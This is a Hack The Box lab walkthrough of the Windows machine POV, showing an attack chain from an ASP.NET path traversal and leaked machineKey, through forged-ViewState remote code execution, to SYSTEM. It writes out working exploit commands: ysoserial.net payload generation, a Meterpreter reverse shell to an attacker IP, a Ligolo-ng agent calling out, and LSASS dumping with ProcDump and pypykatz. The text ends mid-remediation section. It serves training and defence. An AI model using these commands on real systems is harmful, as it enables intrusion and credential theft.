---
title: 'HTB POV: Complete Evidence-Led Walkthrough'
description: An ASP.NET file traversal and machineKey disclosure enabled ViewState RCE, DPAPI credential recovery, localhost WinRM access and SYSTEM migration.
date: 2026-11-12
category: Windows / Web Security
difficulty: Not recorded
tags:
- Hack The Box
- Windows
- ASP.NET
- ViewState
- DPAPI
- Ligolo-ng
- SeDebugPrivilege
published: true
slug: htb-pov
---

# Overview

**Machine:** POV  
**Platform:** Hack The Box  
**Publication format:** htb-pov.md  

The externally reachable service was IIS over HTTP. A virtual host and its CV download action disclosed source and web.config material, exposing an application cryptographic trust boundary.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Enkidu's Field Notes | CPTS Prep Boxes**  
> **Assessment date:** 24 October 2026  
> **Target:** `10.129.89.80`  
> **Hostname:** `POV`  
> **Web hosts:** `pov.htb`, `dev.pov.htb`  
> **Operating system:** Windows Server 2019 Standard (build 17763)  
> **Outcome:** `NT AUTHORITY\SYSTEM` - **confirmed**  
> **Method:** Independent lab enumeration and exploitation; no published POV walkthrough used.

---

### Executive summary

POV was a Windows/IIS machine whose only externally accessible TCP service was HTTP on port 80. A clue on the main website led to a separate development virtual host hosting an ASP.NET Web Forms portfolio. Its CV download functionality trusted a client-controlled hidden `file` parameter, and its attempt to prevent directory traversal removed Unix-style `../` while overlooking Windows-style `..\`. This allowed disclosure of ASP.NET application source and `web.config`, including static cryptographic `machineKey` material.

The recovered signing and encryption keys enabled a forged ASP.NET ViewState payload against the application's contact page. A server-side command execution proof established code execution as the local account `POV\sfitz`. Meterpreter access exposed a PowerShell-exported `PSCredential` XML file; decrypting it **in the original user's DPAPI context** produced the password for `POV\alaading`.

Although WinRM was filtered from the attacker network, it was reachable through the target's own loopback interface. A Ligolo-ng agent on the compromised host and a `240.0.0.1/32` tunnel route exposed that listener to the attack box. This yielded a reliable Evil-WinRM session as `alaading`, a member of `Remote Management Users` with `SeDebugPrivilege` present.

After enabling `SeDebugPrivilege`, an LSASS memory dump succeeded but did not yield Administrator credentials. Direct `OpenProcessToken()` attempts against SYSTEM processes returned `ACCESS_DENIED`. The decisive escalation was simpler: an ordinary Meterpreter session established as `alaading` successfully **migrated into `winlogon.exe` (PID 552)**. `getuid` then returned **`NT AUTHORITY\SYSTEM`**.

#### Verified attack chain

```text
10.129.89.80:80 - IIS / ASP.NET
            |
            v
     Main site: pov.htb
            |
            | HTML clue: dev.pov.htb
            v
 dev.pov.htb/portfolio/
            |
            | Client-controlled file= parameter
            v
   ASP.NET source disclosure
            |
            | Backslash path traversal: ..\web.config
            v
  Static machineKey disclosure
            |
            | Forged signed ViewState / gadget
            v
       RCE as POV\sfitz
            |
            | PowerShell CLIXML + same-user DPAPI
            v
    Password for POV\alaading
            |
            | Ligolo-ng route: 240.0.0.1 -> target localhost
            v
    Evil-WinRM as POV\alaading
            |
            | Enable SeDebugPrivilege
            | Establish Meterpreter as alaading
            v
     migrate 552 (winlogon)
            |
            v
      NT AUTHORITY\SYSTEM
```

**Evidence convention:** Command outputs and outcomes labeled *verified* were observed during the engagement. Commands marked *reproduction template* reconstruct the procedure from observed parameters; they should not be mistaken for byte-for-byte copies of every command typed during the lab. The root flag value was not provided in the captured engagement record and is intentionally omitted.

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Reconnaissance and exposure

#### Network results

The full TCP-port enumeration identified one externally reachable port:

| Port | State | Service | Observation |
|---|---|---|---|
| `80/tcp` | Open | HTTP | Microsoft IIS 10 / ASP.NET |
| All other TCP ports | Filtered | - | No other externally accessible TCP service confirmed |
| Sampled UDP ports | `open|filtered` | - | Inconclusive, not evidence of open UDP services |

**Reproduction template:**

```bash
sudo nmap -Pn -p- 10.129.89.80
nmap -Pn -sV -sC -p80 10.129.89.80
```

A basic web fingerprint confirmed the platform:

```bash
whatweb http://10.129.89.80
curl -i http://10.129.89.80/
```

Relevant observed details:

```text
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
<title>pov.htb</title>
```

The HTML contained an email address for `sfitz@pov.htb` and a specific instruction to visit **`dev.pov.htb`** to view the developer's profile. That clue was more valuable than blindly assuming the IP-hosted page was the only site.

#### Virtual-host discovery

The virtual host was mapped locally:

```bash
sudo sh -c 'echo "10.129.89.80 pov.htb dev.pov.htb" >> /etc/hosts'
```

Browsing the development hostname revealed a portfolio beneath:

```text
http://dev.pov.htb/portfolio/
```

The application used ASP.NET Web Forms, with pages such as:

```text
/portfolio/default.aspx
/portfolio/contact.aspx
```

The contact form exposed typical Web Forms state fields, including `__VIEWSTATE` and `__EVENTVALIDATION`. A preliminary reflection check showed HTML encoding rather than an immediately useful reflected XSS sink. The more important lead was the portfolio's **Download CV** action.

**Enumeration lesson:** Treat links, subdomains, email domains, comments, and text embedded in the site as concrete reconnaissance leads. The initial foothold emerged from a functionality clue, not another exposed network service.

---

## Analysis

The application filtered Unix-style traversal while permitting Windows separators, allowing file disclosure. The leaked machineKey made forged ViewState command execution possible. A CLIXML credential required decryption in the original DPAPI user context, and WinRM was reachable only through the host's localhost interface. LSASS dumping and direct token-open attempts were unsuccessful ways to obtain Administrator credentials; a Meterpreter session as alaading migrated into winlogon.exe and verified SYSTEM.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### ASP.NET CV download - source disclosure

#### Understanding the Web Forms request

Clicking the CV download initiated a form POST to the portfolio page. The important fields were:

| Field | Role |
|---|---|
| `__VIEWSTATE` | ASP.NET state blob |
| `__EVENTVALIDATION` | Validates expected server-control postback events |
| `__EVENTTARGET=download` | Selects the download control |
| `file=cv.pdf` | **Client-controlled download target** |

The legitimate download returned a PDF of approximately **148,225 bytes**. The `file` field was worth testing because the browser could modify a value that appeared to choose a server-side file.

**Representative request (using fresh state values from the page):**

```bash
curl -sS -X POST 'http://dev.pov.htb/portfolio/default.aspx' \
  --data-urlencode '__VIEWSTATE=<CURRENT_VIEWSTATE>' \
  --data-urlencode '__EVENTVALIDATION=<CURRENT_EVENTVALIDATION>' \
  --data-urlencode '__EVENTTARGET=download' \
  --data-urlencode 'file=cv.pdf' \
  -o cv.pdf
```

The exact postback state must be taken from the live form. The displayed placeholders are **not** values recovered during the engagement.

#### Swapping the file parameter

Changing `file` from `cv.pdf` to an ASP.NET file caused the server to transmit **source text**, rather than interpreting that file as a page. One retrieved page began with a Web Forms directive resembling:

```aspx
<%@ Page Language="C#" AutoEventWireup="true"
    CodeFile="index.aspx.cs" Inherits="index" %>
```

The page markup contained an `<asp:LinkButton>` wired to a `Download` handler and an `<asp:HiddenField>` with the default `cv.pdf` value. The code-behind (`index.aspx.cs`) was then retrieved through the same download behavior.

This was significant because it turned an apparently ordinary CV feature into **source-code disclosure**. The tester could stop guessing how the application handled the filename and read the actual implementation.

#### The vulnerable code

The recovered C# logic was:

```csharp
protected void Download(object sender, EventArgs e)
{
    var filePath = file.Value;
    filePath = Regex.Replace(filePath, "../", "");

    Response.ContentType = "application/octet-stream";
    Response.AppendHeader(
        "Content-Disposition",
        "attachment; filename=" + filePath
    );
    Response.TransmitFile(filePath);
    Response.End();
}
```

Three observations mattered:

1. `file.Value` came from the **client-side hidden field**; it was not a trusted server constant.
2. The attempted traversal filter stripped only forward-slash-style traversal (`../`). On Windows, the path separator `\` is accepted, so `..\` was an obvious bypass to test.
3. `Response.TransmitFile(filePath)` served the resulting path directly without constraining it to an allowed directory or filename.

**Root cause:** untrusted filename selection plus inadequate canonicalization and no enforced allowlist or directory boundary. The regex was an incomplete blacklist, not a security boundary.

#### Traversal to `web.config`

Submitting a path equivalent to:

```text
file=..\web.config
```

returned the application's `web.config` file - observed at about **866 bytes**. Because the target was Windows, backslash traversal was sufficient to bypass the forward-slash replacement.

The configuration exposed the application's static ASP.NET `machineKey`, with the following algorithms:

```xml
<machineKey
    validationKey="<REDACTED: LEAKED IN LAB>"
    decryptionKey="<REDACTED: LEAKED IN LAB>"
    validation="SHA1"
    decryption="AES" />
```

Other useful findings included `httpRuntime` targeting .NET Framework `4.5` and application error handling that referenced a redirect to `http://dev.pov.htb:8080/portfolio`. The latter was a configuration clue, **not** evidence that port 8080 was externally reachable; the initial port scan had not shown it open.

**Finding 1 - Arbitrary local file read:** The CV endpoint allowed retrieval of local application files, including the code-behind and cryptographic configuration. **Finding 2 - ViewState signing-key exposure:** Static machine keys enabled subsequent forged state generation, provided the correct ASP.NET parameters and gadget were used.

---

### Forged ASP.NET ViewState to remote code execution

#### Why the keys changed the attack surface

ASP.NET Web Forms uses ViewState to preserve server-control state between HTTP requests. The ViewState blob is commonly integrity-protected using `machineKey` settings. Disclosure of that secret material meant a payload could be generated with cryptographic parameters matching the application, rather than simply submitting arbitrary modified ViewState and hoping it would be accepted.

The attack targeted:

```text
POST http://dev.pov.htb/portfolio/contact.aspx
```

Relevant parameters from the observed engagement:

| Parameter | Value |
|---|---|
| Gadget | `TextFormattingRunProperties` |
| Plugin | ysoserial.net `ViewState` |
| Target page | `/portfolio/contact.aspx` |
| Application path | `/` |
| Validation algorithm | `SHA1` |
| Decryption algorithm | `AES` |
| `__VIEWSTATEGENERATOR` submitted with request | `37310E71` |
| Validation and decryption keys | Extracted from leaked `web.config` |

**Important compatibility point:** The ysoserial.net options `--generator` and `--islegacy` were not appropriate for the successful modern (> .NET 4.0) signing path. For this target, `--path` and `--apppath` were used to derive the correct purpose context. The ordinary `__VIEWSTATEGENERATOR` field was still included in the actual POST request.

#### Tooling detour - why Linux generation initially failed

A substantial part of the lab was spent exploring Linux-side options:

- A ViewState generator on Linux struggled with the newer ASP.NET purpose-based cryptographic behavior.
- Building and executing ysoserial.net under Mono ran into Windows Presentation Foundation/.NET compatibility problems.
- `TypeConfuseDelegate` generated a `NullReferenceException` in the Mono environment.
- `ActivitySurrogateSelectorFromFile` encountered a missing `AggregateDictionary`-related method error.

For example, an observed ysoserial.net attempt with `TypeConfuseDelegate` failed before delivering any usable payload:

```text
System.NullReferenceException: Object reference not set to an instance of an object
at ysoserial.Generators.TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(...)
```

The successful route was to use the Windows-hosted ysoserial.net executable, select the compatible `TextFormattingRunProperties` gadget, and generate the ViewState there. Windows Defender initially quarantined the tool on the user's own Windows host; it was restored for this isolated lab use.

**Workflow lesson:** When a payload generator is fundamentally tied to Windows-only .NET components, change the execution environment rather than spending excessive time patching Mono incompatibilities.

#### ViewState generation

**Reproduction template (PowerShell on the Windows attack host):**

```powershell
$validationKey = '<VALUE_FROM_WEB_CONFIG>'
$decryptionKey = '<VALUE_FROM_WEB_CONFIG>'

.\ysoserial.exe `
  -p <REDACTED> `
  -g TextFormattingRunProperties `
  -c 'whoami > C:\Windows\Temp\pov-proof.txt' `
  --path='/portfolio/contact.aspx' `
  --apppath='/' `
  --validationalg='SHA1' `
  --validationkey="$validationKey" `
  --decryptionalg='AES' `
  --decryptionkey="$decryptionKey" `
  -o base64 `
  --outputpath pov-viewstate.txt
```

This reconstructs the confirmed parameters. The original key values were not preserved in the current conversation record, so they are deliberately represented as placeholders.

#### The output-encoding trap

The tool's `-o base64` output file was **not yet the exact wire-format `__VIEWSTATE` string**. In this engagement it was effectively an extra Base64 wrapper around URL-encoded ViewState text. Sending the wrapper unchanged would not reproduce the working request.

The working preparation decoded the outer Base64 and then URL-decoded the intermediate value:

```powershell
$wrapped = (Get-Content .\pov-viewstate.txt -Raw).Trim()
$intermediate = [Text.Encoding]::ASCII.GetString(
    [Convert]::FromBase64String($wrapped)
)
$rawViewState = [Uri]::UnescapeDataString($intermediate)
[IO.File]::WriteAllText(
    'pov-viewstate-raw.txt',
    $rawViewState,
    [Text.Encoding]::ASCII
)
```

The final file could then be passed directly to `curl --data-urlencode`.

#### Delivering the forged state

The observed delivery pattern was:

```bash
curl -sS -D response.headers -o response.html \
  -X POST 'http://dev.pov.htb/portfolio/contact.aspx' \
  --data-urlencode '__VIEWSTATE@pov-viewstate-raw.txt' \
  --data-urlencode '__VIEWSTATEGENERATOR=37310E71' \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'message=test' \
  --data-urlencode 'submit=Send Message'
```

Here `$EV` held an `__EVENTVALIDATION` value collected from the legitimate contact form.

The HTTP response redirected to an error page (`302` with an ASP.NET error-path parameter). **That did not mean the command failed.** The payload could execute before the page raised or handled an exception, so execution needed to be verified by an independent effect.

#### Independent RCE proof

The payload wrote the output of `whoami` to:

```text
C:\Windows\Temp\pov-proof.txt
```

The file was then retrieved using the earlier traversal primitive. Its contents were:

```text
pov\sfitz
```

**Verified finding - Remote code execution:** Forged ViewState caused server-side command execution as the local account `POV\sfitz`. The proof relied on a separately observable artifact, not solely on response code or tool output.

---

### From RCE to a usable Meterpreter session

The initial code-execution primitive was enough to download and launch a Windows x64 Meterpreter reverse-TCP payload. The attacker VPN address used during the engagement was `10.10.15.31`, with TCP port `4444` for the callback.

**Reproduction template:**

```bash
msfvenom -p <REDACTED> \
  LHOST=10.10.15.31 LPORT=4444 -f exe -o pov.exe
```

Handler configuration:

```text
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.31
set LPORT 4444
run -j
```

The payload was served over a temporary HTTP server, retrieved by a command executed through the forged ViewState, and launched on POV. A working Meterpreter session was confirmed as `POV\sfitz`.

Initial Windows enumeration found:

```text
OS: Windows Server 2019 Standard (build 17763)
Host: POV
Join state: WORKGROUP (not an Active Directory domain)
Current identity: POV\sfitz
```

`sfitz` did not have an immediately usable privilege-escalation token. In particular, it did **not** possess `SeDebugPrivilege` or `SeImpersonatePrivilege`. The host had a local `Administrator` account and a second regular user, `alaading`, who was in `Remote Management Users`.

**Enumeration lesson:** We did not force local privilege escalation from the web identity. Finding another legitimate local credential became the more promising route.

---

### Credential recovery from PowerShell CLIXML

#### Finding `connection.xml`

During filesystem triage of the `sfitz` profile, we identified:

```text
C:\Users\sfitz\Documents\connection.xml
```

This was a PowerShell `Export-Clixml`-style serialized `PSCredential` object. It contained a username (`alaading`) and a DPAPI-protected password representation.

That distinction matters: the XML was **not simply a plaintext password file**. A PowerShell credential serialized on Windows typically uses DPAPI under the exporting user's security context. Reading the XML as a different user does not necessarily reveal the plaintext secret.

#### Import and decrypt in the original context

From the compromised `sfitz` PowerShell context:

```powershell
$cred = Import-Clixml 'C:\Users\sfitz\Documents\connection.xml'
$cred.UserName
$cred.GetNetworkCredential().Password
```

**Verified result:**

```text
Username: alaading
Password: [REDACTED]
```

The credentials belonged to the local account `POV\alaading`. The important weakness was the availability of a decryptable exported credential inside a compromised user's profile, not a cryptographic break of DPAPI.

#### Validate the new identity locally

A local PowerShell remoting test succeeded:

```powershell
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    whoami
    whoami /priv
}
```

Observed identity:

```text
POV\alaading
```

Privilege enumeration showed `SeDebugPrivilege` was **present but initially disabled** in this user's token. Attempts to use `Enter-PSSession` interactively from a PowerShell session nested inside Meterpreter were unstable: commands echoed without reliable interactive execution, and session-exit commands behaved inconsistently.

This was a shell-management issue rather than invalid credentials. We already had a way to authenticate as `alaading`; the goal was to get a direct, stable channel.

---

### Ligolo-ng localhost pivot to WinRM

#### The access mismatch

The target's TCP/5985 was filtered from the attacker network, but the Windows host itself answered WinRM requests on its local interface:

```powershell
Test-WSMan localhost
```

This suggested that direct Evil-WinRM would fail over `10.129.89.80:5985` while a tunnel through the compromised host could connect to `127.0.0.1:5985` internally.

Ligolo-ng supports the special destination `240.0.0.1`, which the agent maps to its own `127.0.0.1`. This was the key to reaching the target's **localhost-only service** without making an external WinRM port accessible.

#### Set up the Parrot tunnel

On Parrot:

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

Start the Ligolo-ng proxy (default listener TCP/11601):

```bash
./proxy -selfcert
```

The compromised Windows endpoint received the Windows agent via Meterpreter. Its observed location was:

```text
C:\Users\sfitz\agent.exe
```

The agent was launched from the `sfitz` context:

```powershell
Start-Process -FilePath 'C:\Users\sfitz\agent.exe' `
  -ArgumentList '-connect 10.10.15.31:11601 -ignore-cert' `
  -WindowStyle Hidden
```

At the Ligolo proxy console, the active agent session was selected, and forwarding was started on `ligolo`:

```text
session
start --tun ligolo
```

The exact session selection is environment-specific; do not assume an agent ID from this writeup.

#### Confirm routing before authenticating

From Parrot:

```bash
nmap -sT -Pn -p5985 240.0.0.1
```

**Verified output:**

```text
Nmap scan report for 240.0.0.1
Host is up (0.29s latency).

PORT     STATE SERVICE
5985/tcp open  wsman
```

This was proof that the Ligolo route worked, independent of authentication.

#### Obtain a stable WinRM shell

```bash
evil-winrm -i 240.0.0.1 -u alaading -p '<REDACTED>'
```

**Verified result:**

```text
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alaading\Documents>
```

The authenticated shell was now running as `POV\alaading`. The Ruby `Reline` warning about remote-path completion was cosmetic and unrelated to successful authentication.

**Pivoting lesson:** Port filtering on the attacker-facing interface does not prove a service is unreachable from inside the target. Localhost mapping is particularly useful when a compromised endpoint can run a Ligolo agent.

---

### Enumerating and enabling SeDebugPrivilege

The new user was a member of the local `Remote Management Users` group. Its privilege list included:

```text
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The important observation was **presence**, not initial state. A privilege listed as `Disabled` may sometimes be enabled in a suitable token context, whereas a privilege entirely absent from the token cannot be enabled merely by calling `AdjustTokenPrivileges`.

#### Privilege-enabling script and troubleshooting

An `enable.ps1` script containing an `Enable-Privilege` function was used during testing. The script relied on Win32 APIs including `LookupPrivilegeValue`, `OpenProcessToken`, and `AdjustTokenPrivileges`.

The initial remote/invoked variant reported `AdjustTokenPrivileges() FAIL`, despite finding the `SeDebugPrivilege` LUID. We also encountered a permissions issue when trying to read `C:\Users\sfitz\enable.ps1` from the `alaading` security context: access to one user's home directory cannot be assumed merely because both accounts exist on the machine.

After switching to a workable execution context, privilege enumeration confirmed:

```text
Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Reproduction pattern when the script is accessible in the current user's directory:**

```powershell
. .\enable.ps1
Enable-Privilege -Privilege SeDebugPrivilege -Verbose
whoami /priv
```

The final enabled state is verified. The captured conversation does not contain a complete, unambiguous transcript of the one successful enabling invocation, so the three-line sequence above is documented as a **reproduction pattern**, not asserted as the verbatim successful terminal history.

---

### LSASS dumping - a useful but non-decisive branch

With `SeDebugPrivilege` enabled, ProcDump was staged at:

```text
C:\Users\Public\procdump64.exe
```

A separate attempted path, `C:\procdump64.exe`, failed because the file was not actually there. The correct path mattered.

Execution:

```powershell
& 'C:\Users\Public\procdump64.exe' -accepteula -ma lsass.exe 'C:\Users\alaading\Documents\lsass.dmp'
```

**Verified output:**

```text
ProcDump v12.02
Dump 1 initiated: C:\Users\alaading\Documents\lsass.dmp
Dump 1 writing: Estimated dump file size is 45 MB.
Dump 1 complete: 45 MB written in 1.4 seconds
Dump count reached.
```

The dump was retrieved with Evil-WinRM:

```text
download C:\Users\alaading\Documents\lsass.dmp
```

Offline processing on Parrot:

```bash
pypykatz lsa minidump lsass.dmp | tee lsass-analysis.txt
```

#### Recovered items

| Account / session | Material observed | Interpretation |
|---|---|---|
| `POV\sfitz` | NTLM `[REDACTED_HEX]` | User's local NT hash |
| `POV\sfitz` | DPAPI master-key material | DPAPI secrets present in LSASS |
| `POV\alaading` | Plaintext `[REDACTED]` in SSP | Password already recovered via CLIXML |
| System-associated sessions | DPAPI data | Not Administrator credentials |
| `POV\Administrator` | **Not recovered** | No basis for Administrator pass-the-hash |

The plaintext `alaading` credential appeared in an SSP entry associated with an `sfitz` logon session, consistent with that account having used the credential during earlier PowerShell remoting.

**Interpretation:** The LSASS dump was a confirmed privileged read of process memory, but it did **not** deliver the missing Administrator hash. At this point, additional credential scraping was lower priority than directly evaluating what `SeDebugPrivilege` could do for process access.

---

### Why the token-access probe was a misleading dead end

A small custom C# P/Invoke probe was built to test access to the security tokens of SYSTEM processes. These targets were confirmed in the process list:

```text
PID 624  services.exe   Session 0
PID 552  winlogon.exe  Session 1
```

The probe first called `OpenProcess` with `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`), then attempted `OpenProcessToken` with:

- `0x0008` - `TOKEN_QUERY`
- `0x000A` - `TOKEN_QUERY | TOKEN_DUPLICATE`

The original P/Invoke declaration omitted `SetLastError=true` on `OpenProcessToken()`, falsely producing `Win32 Error: 0`. After correcting it, the failures were clear:

```text
PID=624 Access=8  Success=False Error=5
PID=624 Access=10 Success=False Error=5
PID=552 Access=8  Success=False Error=5
PID=552 Access=10 Success=False Error=5
```

**Error 5 = `ERROR_ACCESS_DENIED`.**

The same probe successfully opened the current WinRM process's own token:

```text
Own PID: 960
Token accessible: True
Error: 122
```

`Error: 122` here was a stale last-error value, because the API itself returned `True`. It did not mean the successful token query failed.

#### What the test did and did not prove

It proved that **this WinRM-side process** could not obtain those specific requested SYSTEM token access rights via the tested API. It did **not** prove that every other cross-process operation would fail. In particular, Meterpreter's migration mechanism was not equivalent to our hand-written `OpenProcessToken()` test.

This distinction was the critical lesson of the final escalation.

---

### Investigated alternative: PrivFu SeDebugPrivilegePoC

The PrivFu proof of concept was reviewed and its build requirements explored:

```text
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
```

This project demonstrates another route involving `SeDebugPrivilege`: attempting privileged process access to `winlogon.exe` and using Windows process-creation attributes to set a privileged parent process.

On Parrot, the source directory contained:

```text
App.config
Properties/AssemblyInfo.cs
SeDebugPrivilegePoC.cs
SeDebugPrivilegePoC.csproj
```

A Mono compilation workflow was investigated (`mono-devel` and `mcs`) because the project targeted classic .NET Framework rather than requiring a contemporary Linux `dotnet` SDK install.

**Evidence boundary:** Although the approach was investigated, the captured record does **not** establish that a PrivFu-spawned process provided the final SYSTEM access. The ultimately successful session was `reverse.exe` under `POV\alaading`, with `wsmprovhost.exe` as its parent, followed by **direct Meterpreter migration**. Therefore, PrivFu should be recorded as a considered alternative, **not the verified root exploit**.

---

### Final escalation - Meterpreter migration into winlogon.exe

This is the decisive stage of the engagement.

#### Establish Meterpreter under `alaading`

A second Meterpreter reverse connection was obtained with `POV\alaading` as the running identity. The observed process list identified:

```text
PID 992   PPID 3700  reverse.exe      x64  Session 0  POV\alaading
PID 3700  PPID 776   wsmprovhost.exe  x64  Session 0  POV\alaading
PID 552   PPID 472   winlogon.exe     x64  Session 1
```

The `reverse.exe` process ran under the WinRM process tree, proving this was an `alaading`-context Meterpreter session rather than a new SYSTEM process already created by PrivFu.

#### Migrate directly

From the new Meterpreter session:

```text
(Meterpreter 2)(C:\Users\alaading\Documents) > migrate 552
[*] Migrating from 992 to 552...
[*] Migration completed successfully.
```

Then verify:

```text
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Verified outcome: full Local SYSTEM security context.**

#### Why this succeeded after `OpenProcessToken` failed

The prior test attempted to **open another process's security token with specific token rights**. Meterpreter migration instead used its process migration/injection mechanisms to run the session in a different process security context. These operations have different implementation details and access checks. A denial from `OpenProcessToken()` therefore did not rule out a viable migration path.

The earlier LSASS dump also established that enabled `SeDebugPrivilege` gave meaningful access to at least one protected, high-value process memory area. It was reasonable to evaluate process-based escalation before abandoning this privilege.

**Operational caveat:** `winlogon.exe` is critical to Windows. Injecting or migrating into it can cause session disruption or host instability if the operation fails. The successful outcome here is specific to this authorized lab; it should not be generalized as universally safe or successful.

#### Outcome and flag status

The visible record ends with the successful `getuid` result. No root-flag value or command reading the flag was supplied in the record used to prepare this writeup. **SYSTEM compromise is fully verified; flag collection is not documented.** No value has been invented.

---

### Missteps, false leads, and what to do differently

| Issue | What happened | Better practice |
|---|---|---|
| Underestimating the client-side hidden field | The CV control looked benign | Treat every client-supplied value, including hidden controls, as untrusted |
| Weak path-filter assumption | Only `../` was removed | Test Windows `..\` and canonicalization boundaries; inspect source when disclosed |
| ViewState tool compatibility | Linux/Mono gadget generation repeatedly failed | Prefer the native Windows environment for Windows-specific .NET gadget tooling |
| Double-encoded ViewState | Tool output was not the final HTTP parameter | Inspect transformation layers and compare the actual submitted byte/string format |
| Interpreting a 302 as failure | Payload execution was followed by an error redirect | Verify exploitation through an out-of-band or filesystem side effect |
| Nested interactive PowerShell remoting | `Enter-PSSession` inside Meterpreter was unstable | Prefer a direct shell or use single-shot `Invoke-Command` |
| External WinRM filtered | Port 5985 appeared inaccessible from Parrot | Test local service reachability and use Ligolo localhost mapping |
| Incorrect Procdump path | Uploaded binary and invoked path differed | Confirm staging locations with `Get-Item` before execution |
| LSASS credential rabbit hole | Dump succeeded but no Administrator secret | Read recovered evidence and stop when returns diminish |
| Token-access fixation | `OpenProcessToken` returned error 5 | Distinguish token duplication, process memory access, and session migration |
| Delayed Meterpreter migration | Existing tool capability was overlooked | With enabled SeDebug and a usable Meterpreter, evaluate process migration early, with stability risks in mind |
| Premature PrivFu attribution | A PoC was investigated around the final step | Attribute success only to the operation confirmed by process and session evidence |

#### A more efficient decision tree

```text
Web foothold
  -> Enumerate local users, files, process token, and credential stores
  -> If password/PSCredential found: validate in original security context
  -> If WinRM filtered but local WSMan works: Ligolo localhost route
  -> In new identity: whoami /all and privilege inventory
  -> If SeDebugPrivilege present: enable and verify
  -> Evaluate simplest suitable capability already available
       -> Meterpreter process migration (lab-safe assessment only)
       -> If unavailable: diagnose rights, tokens, PPL, process access
       -> Consider alternate PoCs only when necessary
  -> Verify resulting identity independently
```

The ordering is the lesson. The value is not merely memorizing a specific PID. It is **recognizing available primitives, selecting the least complicated viable path, and using evidence to stop unproductive branches**.

---

### Appendix A - Compact command reference

```bash
# Hostname mapping
sudo sh -c 'echo "10.129.89.80 pov.htb dev.pov.htb" >> /etc/hosts'

# Basic web fingerprint
whatweb http://10.129.89.80

# Ligolo TUN and special localhost route
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
./proxy -selfcert

# Verify mapped target localhost WinRM
nmap -sT -Pn -p5985 240.0.0.1

# Authenticate as recovered local user
evil-winrm -i 240.0.0.1 -u alaading -p '<REDACTED>'

# Parse LSASS dump locally
pypykatz lsa minidump lsass.dmp | tee lsass-analysis.txt
```

```powershell
# Credential recovery must run in sfitz's applicable DPAPI context
$cred = Import-Clixml 'C:\Users\sfitz\Documents\connection.xml'
$cred.GetNetworkCredential().Password

# Validate local credentials
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    whoami
    whoami /priv
}

# Check debug privilege in alaading session
whoami /priv

# Verified LSASS dump invocation
& 'C:\Users\Public\procdump64.exe' -accepteula -ma lsass.exe 'C:\Users\alaading\Documents\lsass.dmp'
```

```text
# Final verified SYSTEM escalation, from Meterpreter as POV\alaading
meterpreter > ps
meterpreter > migrate 552
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

*Prepared from the user's POV engagement evidence and terminal outputs. This is a training-lab writeup, not a claim that every reproduction template was run verbatim.*

## Impact

The final getuid output directly confirmed NT AUTHORITY\SYSTEM. A literal root flag read was not retained.

### Evidence ledger

| Milestone | Evidence | Confidence |
|---|---|---|
| Externally reachable web service | TCP/80 and IIS/ASP.NET headers | Verified |
| Development virtual host | Main-page `dev.pov.htb` clue and portfolio | Verified |
| CV endpoint file disclosure | Raw ASPX/code-behind returned | Verified |
| Backslash traversal | `..\web.config` returned configuration | Verified |
| Static machineKey exposure | SHA1/AES keys recovered from `web.config` | Verified (key bytes not repeated) |
| ViewState RCE | Proof file contained `pov\sfitz` | Verified |
| Initial user shell | Meterpreter as `POV\sfitz` | Verified |
| Credential recovery | `connection.xml` imported under `sfitz` | Verified |
| Remote management access | `Invoke-Command` and Evil-WinRM as `alaading` | Verified |
| Ligolo route | `240.0.0.1:5985` reported open | Verified |
| Debug privilege enabled | `whoami /priv` showed Enabled | Verified |
| LSASS memory access | 45-MB ProcDump completed | Verified |
| Administrator hash recovered | Not found in Pypykatz output | Not achieved |
| SYSTEM token duplicated via probe | Win32 error 5 | Failed |
| PrivFu-spawned SYSTEM process | No conclusive evidence in record | Not credited |
| Meterpreter migration | `migrate 552` succeeded | Verified |
| Full compromise | `getuid` = `NT AUTHORITY\SYSTEM` | **Verified** |
| Root flag read | No captured value | Not documented |

---

### Final assessment

**POV was a strong exercise in chaining vulnerabilities across layers**, not merely exploiting one exposed service. It rewarded recognizing a virtual-host clue, questioning hidden form controls, identifying Windows-specific traversal behavior, understanding ASP.NET ViewState cryptography, recovering DPAPI-bound credentials in the correct user context, and using Ligolo-ng to reach a local service invisible from the attacker's network.

The most important operational lesson came at the end. We spent too long treating a failed token-open test as the end of the `SeDebugPrivilege` path. But the machine was ultimately compromised through an existing capability: **Meterpreter migration into `winlogon.exe`, followed by a verified SYSTEM identity**.

**Final status: `NT AUTHORITY\SYSTEM` - confirmed.**

---

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Security findings and remediation perspective

This was an HTB training machine, but the flaws illustrate concrete failure modes applicable to real ASP.NET/Windows environments.

#### Finding A - Unsafe file selection in CV download

